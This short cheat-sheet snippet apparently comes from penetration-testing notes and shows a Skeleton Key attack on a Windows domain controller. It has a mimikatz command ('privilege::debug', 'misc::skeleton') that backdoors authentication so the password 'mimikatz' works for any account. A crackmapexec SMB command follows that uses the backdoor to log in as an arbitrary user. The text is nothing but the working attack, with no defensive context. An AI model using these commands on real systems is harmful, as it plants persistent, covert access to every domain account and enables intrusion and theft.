# On Domain Controller (requires DA)
mimikatz "privilege::debug" "misc::skeleton"

# Any user can now authenticate with "mimikatz" password
crackmapexec smb $DC -u any_user -p mimikatz --shares